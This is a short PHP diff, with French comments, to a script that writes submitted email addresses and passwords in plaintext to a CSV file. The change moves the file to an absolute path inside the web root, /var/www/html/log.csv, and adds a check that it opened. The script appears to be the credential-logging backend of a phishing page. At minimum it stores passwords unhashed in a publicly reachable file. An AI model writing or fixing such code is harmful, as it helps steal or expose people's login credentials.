@@ -8,11 +8,16 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $email_clean = htmlspecialchars($email);
     $password_clean = htmlspecialchars($password);
 
-    // Spécifier le fichier CSV
-    $file = 'log.csv';
+    // Spécifier le fichier CSV avec un chemin absolu
+    $file = '/var/www/html/log.csv';
 
     // Ouvrir le fichier CSV en mode ajout (append)
     $handle = fopen($file, 'a');
+
+    // Vérifier si le fichier a bien été ouvert
+    if (!$handle) {
+        die('Impossible d\'ouvrir le fichier log.csv. Vérifiez les permissions.');
+    }
 
     // Créer une ligne avec l'email et le mot de passe
     $data = array($email_clean, $password_clean);
